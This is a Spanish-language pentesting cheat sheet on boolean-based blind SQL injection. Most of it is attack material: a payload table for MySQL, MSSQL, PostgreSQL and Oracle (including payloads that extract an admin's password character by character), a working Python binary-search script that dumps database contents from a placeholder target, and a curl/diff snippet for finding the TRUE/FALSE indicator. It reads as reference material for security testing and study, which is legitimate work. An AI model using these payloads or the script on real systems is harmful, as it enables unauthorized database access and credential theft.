---
aliases:
  - Boolean-based Blind SQLi
  - SQL Injection Boolean
  - SQLi Boolean-Based
  - Boolean-Based SQLi
tags:
  - type/technique
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[SQL Injection (SQLi)]]'
---
# SQLi - Boolean based

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `' AND 1=1-- -` vs `' AND 1=2-- -` | Confirma que la app responde diferente a TRUE vs FALSE | Probe canónico de blind. |
| `' AND (SELECT SUBSTRING((SELECT database()),1,1))='a'-- -` (MySQL) | Si responde como TRUE, primer char de DB es 'a' | Char-by-char enum DB name. |
| `' AND (ASCII(SUBSTRING((SELECT version()),1,1)))>50-- -` (MySQL) | Permite búsqueda binaria sobre ASCII | Optimiza requests (log2(256) ≈ 8 reqs/char vs 256). |
| `' AND (ASCII(SUBSTRING((SELECT @@version),1,1)))=115-- -` (MSSQL) | Equivalent MSSQL | Backend MSSQL. |
| `' AND (SUBSTRING((SELECT current_database()),1,1))='p'-- -` (PostgreSQL) | Equivalent PostgreSQL | Backend PostgreSQL. |
| `' AND (ASCII(SUBSTR((SELECT user FROM dual),1,1)))=83-- -` (Oracle) | Equivalent Oracle | Backend Oracle, `FROM dual` obligatorio. |
| `' AND (SELECT COUNT(*) FROM users)>10-- -` | Count de filas — confirma table exists + cardinalidad | Recon de schema. |
| `' AND (SELECT LENGTH(password) FROM users WHERE id=1)=32-- -` | Longitud de un campo específico | Pre-extracción. |
| `' AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')-- -` | Extracción dirigida de un user específico | Foco en admin. |
^sqli-boolean

### Workflow con script de búsqueda binaria

```python
#!/usr/bin/env python3
import requests
import string

URL = "https://target/items?id=1"
COOKIES = {"PHPSESSID": "abc"}

def is_true(payload):
    """Devuelve True si la respuesta indica condición TRUE."""
    r = requests.get(URL + payload, cookies=COOKIES)
    # Adaptar el indicador — puede ser content-length, status code, string en body, etc.
    return "Welcome" in r.text  # o len(r.text) > 1500, o r.status_code == 200

def extract_char(position, query):
    """Búsqueda binaria sobre ASCII para extraer un char."""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND (ASCII(SUBSTRING(({query}),{position},1)))>{mid}-- -"
        if is_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

# Ejemplo: extraer nombre de la database actual
query = "SELECT database()"
result = ""
for i in range(1, 50):
    char = extract_char(i, query)
    if char == "\x20" or ord(char) < 32:  # fin de string
        break
    result += char
    print(f"[{i}] {result}")

print(f"\n[+] Final: {result}")
```

### Identificar el indicador de TRUE/FALSE

```bash
TARGET="https://target/items?id=1"

# Comparar respuestas
TRUE_RESP=$(curl -s "$TARGET' AND 1=1-- -")
FALSE_RESP=$(curl -s "$TARGET' AND 1=2-- -")

# Buscar diferencias
diff <(echo "$TRUE_RESP") <(echo "$FALSE_RESP")
echo "TRUE  length: $(echo -n "$TRUE_RESP" | wc -c)"
echo "FALSE length: $(echo -n "$FALSE_RESP" | wc -c)"

# Variar el indicador en el script según qué cambia (length, status, body string)
```

___

## Overview

**Boolean-based blind SQLi** = sin output reflejado ni errores expuestos, inferir resultados via condiciones TRUE/FALSE que cambian la respuesta HTTP.

**Indicadores típicos de TRUE/FALSE:**
- Content-Length diferente.
- Status code diferente (200 vs 500).
- Presencia/ausencia de un elemento DOM ("Login successful" vs "Error").
- Redirect (302 vs 200).

**Optimización clave:** búsqueda binaria con `ASCII(SUBSTRING(...)) > N` reduce de 95 requests/char (alfabético) a ~7 (log₂(95)).

Si la app responde idéntica TRUE/FALSE → pivotar a [[SQLi - Time based]].

***
